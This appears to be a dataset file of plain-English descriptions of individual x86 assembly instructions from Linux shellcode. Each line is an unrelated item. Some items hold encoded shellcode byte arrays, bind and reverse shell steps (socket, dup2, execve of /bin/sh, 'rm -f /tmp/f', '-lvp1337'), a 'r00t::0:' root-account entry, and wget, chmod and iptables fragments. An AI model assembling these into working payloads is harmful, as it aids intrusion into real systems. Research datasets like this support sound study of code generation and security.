define shellcode as the array of bytes 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88
load execve syscall into eax register
declare the encrypt label
call the quit function
load execve syscall number into eax register
load 0x2 into ecx register and call kernel
push null on stack two times
copy the byte in bl register to the space in memory at the address esi+0xb
push edx and esi content on stack
execute exit syscall
moving the pointer to the string '/bin//cn' to ebx
declare _incaddr label
move ah into the address [esp+58]
socket()
load syscall for dup2()
go to _zero6 label
transfer the immediate constant 45h to ax
increment ecx content
save the memory location of arg[0] into the ecx register
subtract the contents of dl from the cl register
define decoder_label
make the kernel call
add 16 to ebx
define len equal to the length of msg
increment ebx content and push it on stack
push ecx on stack
push null two times on satck
load execve syscall number into al register and ping kernel
clear the eax register and move the next byte of the shellcode into the lower byte of the register
add 2 to the contents of the eax register
declare the exit_on_error label
jump to the aslr_file label
jump to duploop if not negative
push port number 9090 on stack
push the pointer to host_sockfd stored in esi on stack
decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero
define the _start label and jump short to the call_decoder
increment the contents of the ecx register
clear eax register the load exit syscall number in it and call kernel
define S2 as the array of bytes 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
push ecx on the satck
push byte 0 onto stack
clear eax register
right shift by 4 bits bl
declare the three label
subtract 20h from the 8-bit at memory location buff
if the carry flag or the zero flag are set go to __bss_start+0x16
load hexadecimal value 0x1ff into cx register
push the byte 2 and esi content on stack
system call waitpid
define the byte string '0e2h'
add the contents of the edx register to the contents of eax register
point to the next word in the ecx
define _aslr_file label
load null terminated string '////usr/bin/wget' intp ebx register
call sys_write
subtract 0x04feca01 from the contents in eax and save the result in eax
move the value 672274793 into the ecx register
add 48 to ebx
move decimal number 255 into edx
preserve ecx on the stack
define string as the byte string 'prova.txt'
create the doubleword variable z in memory and initialize it to zero
push 0x61655220 onto the stack
load 5 into bl register
define call_shellcode and call decoder function
copy the byte at the address esi+eax*1 into bl register
push edx
jump to exeunt if not zero
define the byte string '/bin/sh#sh#'
left shift the contents of eax by 5 bit positions
load execve in eax
make the syscall to terminate the program
copy the address of eax in ecx
define the doubleword arr and initialize it to 20
perform and operation between eax and 40392b29 and save the result in eax
push the value 0x6e7a762d onto the stack and point the ebp register to the stack register
push edx content two times and esi content onto the stack
go to _zero5 label
move 0x17 into al
reserve an array of ten reals for realarray
xoring ebp with edi register
define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
compare if eax is zero
zero out ecx and eax register
direction flag equal to zero
define the label 1
perform a short unconditional jump to _file label
point to the next byte in ecx
push 0x6e69622f onto the stack
zero out edi register
save the newly created socket from eax to esi
zero out ecx
perform the xor between the current byte in esi and dl
copy 4 into bl register
push (////bin/dash) into the stack
move 2 into al
push /bin/sh onto the stack and point the eax register to the stack register
push the value 0x64687373 onto the stack and point the edx register to the stack register
copy the byte contained into edi register in bl register
define lenght of shellcode, len
saves stage address to edx
if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270 then jump to the while label
jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h
copy the double word in ebx register into the memory space at the address esi+0x10
push 0x2e383631 to the stack
decrement the ecx register by one
make the system to load and run the program
push '-c' value on stack
perform xor between bl and 0xbb and jump to encoded if the result is zero
jump to the loop2 label if the contents of the cl register is not equal to the value 0x3
push zero on stack
zero out eax and edx registers
push 'r00t::0:' on stack
point eax to the next byte of the shellcode
make syscall
define the byte string 'rm -f /tmp/f'
push null terminator on stack
push hexadecimal value 0x2 as a word on stack
xoring bx and ax register and if the result is 0 go to call_decoder
clear eax and edx
load write syscall number into eax register
multiply the contents of eax by the 32-bit contents of the memory location value
push _ip onto the stack
move value of 0x010ch into the register ax
restore the top of the stack into esi register
add the value 0x3 into al register
init new socket fd
define _call_write label
copy al content into memory space at the address ebx+35
push the string //bin/sh on the stack
clear ecx
push 0x30313a31 to the stack
set ebx=2 and edx=sockfd
if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label
move esp into ebx
add 48 to eax
load the effective address of the result of the operation [zero_reg+6] into the eax register
perform un unconditional jump to call_decoder label
move ASCII /bin/sh into ecx
push 'rp//' on stack
load the string iptables in edi register and load the string //sbin // in ebx register
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label
push 0x2e373231 to the stack
push the value of register ecx onto the stack
go to call_shellcode
push zero addrlen on stack
push hexadecimal values 0x6, 0x1 and 0x2 on stack
save addr of stack into ecx
move 0x88998899 into ecx
pick up ebx content from stack
if not zero jump to numeric label 1
define _write label
system call read
push the byte 0x0b onto the stack
zero out zero_reg
move dl into al
move msg1 string into eax
push ebx in the stack and then move its contents into ecx register
load byte 3 into esi register
negate eax
put zero into ebx and eax
jump to _ entrypoint
copy the byte contained in bl register to the memory address edi
push the 0x74756f2f onto the stack
accept =5
call socket()
increment the contents of the dl register
reset both lower and upper bytes of eax to be 0
put the syscall 4 into the eax register
ecx point to the top of the stack
execute no operation
move 0xff to dl
define _zero17 label
define the numeric label 3
push encoded_shellcode pointer to stack for later execution
declare _notdecode label
put syscall execve code in al register
make the system call to close the file
add 0x5 to edx and jump to L2 if the result is not 0
load address of -lvp1337 in ebx
jump short to the fileaddress label
declare _dup label
define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
add 0x21354523 to the contents in esi and save the result in esi
push the byte 54 onto the stack
move eax into the dword at address [esi + 12]
push '/bin' on stack
go to _encrypt label
push 0x72706475 onto the stack
mask out lowest 4 bits of the ebx register
preserve ebx on the stack
move ebp into edx
execute fork syscall
addr lenght 16
load chmod syscall into al register
declare the process_shellcode label
declare a byte containing 0x68
jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label
declare an uninitialized byte referred to as location var2
push '///h' on stack
put the syscall 37 into the eax register
set sys_bind = 2
add 48 to edx
declare the data section
move the memory location of args to ecx
if not zero jump short to the _paren label
load eax content into edx
jump to label _accept
subtract the byte value 3 from the contents of ebx and save the result in ebx
load 'udprdy:' into edx register
extract ecx from the stack
push the value 0x6e7a762d onto the stack and point the edi register to the stack register
push the pointer to struct on stack
one's complement negation of the byte edi in memory
perform the xor between bl and the byte in esi+edx
load __nr_creat into al register
load the effective address of the result of the operation [esi+15] into the ebx register
load the pointer to args into ebx register
push the byte 0x1c onto the stack
subtract 0x4 from the byte at the address edi and negate the result
exchange eax with ebx
subtract 0x2c3d2dff from the contents in eax and save the result in eax
right shift the contents of the dl register by 1 bit
push edx and esi contents on the stack and then load the stack pointer into ecx register
perform the xor operation between the al register and the value 0x4a
push hsz/ on stack
call kernel
if the zero flag is clear or the sign flag equals the overflow flag go to the address at encoded + 0x18
move 0x01 into dl
put the syscall 8 into the eax register
syscall 102
define decode_xor label
decrement the bl register and jump to L1 if the result is zero
push port 1472 (hex)
convert the doubleword with sign (32 bit) provided in eax into the quadword with sign (64 bit) left in edx:eax
define write label
jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register
system call lseek
move ecx content to edi register
put 1 in al register
move esi into ebx
restore the top of the stack into ebx register
decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
then add to it the hexadecimal value 0x2f2f
define inc_dec
define _connect label
move the number of bytes of var2 into ecx
make the system call
push 0x782f6e69 onto the stack
push the byte 0x2 to the stack
move stack ptr into ecx
move to the next byte in the shellcode and jump to L2
decrement the contents of the cl register and jump to the dup2 label if the result is not negative
move al into the byte at address [esi+17]
create main label
declare the setup label
replaces the contents of the ecx register with its two's complement
obtain the address of the first instruction of the shellcode
define a byte and initialize it to 0xdeadbeef
load __nr_socketcall into eax register
add eax to esi
push the arg af_inet onto the stack
define _zero14 label
add the value 8 from the byte in edi and negate it
define _fileaddress label
store the pointer to the encoded shellcode in esi
if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register
define the function F3, negate al and point to the next byte in al
right shift the contents of the ebx register by the contents of the cl register
jump to dup2 if not negative
save the fd from the socket
push 0x69622f65 onto the stack
push 0x4c5a304b onto the stack
push 0x204c4c41 onto the stack
define _decrypt label
decrement the byte at the address dl by one
move the byte at the address [esi] into cl
perform or operation between the al register and syscall_execve
decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
negate all the bits of the ax register
load execve syscall into eax register
push the 0x76766c2d onto the stack
add 0x2 to the contents of ebp
define _reading label
load the address esi+12 into edx register
move 0x2 into ebx
declare _call_shellcode label
push hs//
move 0x21 into al
push esi and edi content on stack
add hexadecimal value 0x2 to al register
clean eax and ebx registers
move 0x735f6176 into esi
move satck pointer to ecx
increment dl register
system call exit
subtract 1663 from bx and save the result into bx
define L3 and jump short to L4 label
go to _zero16 label
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register
push 2 onto stack
push the dword 0x656e7265 onto the stack
move the byte at the address 2ah into al
put the syscall 0x30 into the eax register
jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register
push /bin//sh +\x00 on the stack and then point ebx where that string is located
declare the createfile label
move 37 into al
increment the contents of the cl register
perform the xor operation between the byte at memory location esi+ecx and 0x0f
multiply by ecx, zero out eax and edx
perform an unconditional jump to encodedshellcode_label
system call open
define _zero9 label
put the syscall 0x10 into the eax register
save shellcode address into esi register
move socket call number to al register
declare the shell label
perform the xor between bl and 0xbb and jump to formatting if it is zero else move the byte of the shellcode in cl
push the stack onto esi and move the contents on edi
push 0x04020a0a onto the stack
load execve syscall into al register
push 'hmod' on stack
zero out edx register then push its content on stack
jump short to the _execline label
increment ebx content defining sys_socket =1
transfer control to the instruction at the address 0x8585
define _zero1c label
decrement ebx by 1
loading the cmd argument: linux_reboot_cmd_restart in edx
move 0x46 into al
move the contents of memory address ebp+12 into esi
define the doubleword an_integer and initialize it to 12425
checking current address with egg two times
left shift cx
if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
push 0x61622f2f onto the stack
jump to the label l4 if the contents of the eax register is not zero else call the function search
push 0x3a30754a onto the stack
function decode
reset eax
call the sprint function
zero out eax, ebx and ecx
initialize a string to 'egg mark'
jump short to the routine inc_dec
call socketcall
pop stack(2 = sys_bind = bind()) into ebx
push esp pointer to ebx
declare var byte variable and initialize it to 32
define fupdisasm function
jump short to the gotocall label
load __nr_socketcall syscall into al register
copy hexadecimal value from 0xcc to bh register
make the system call for exit
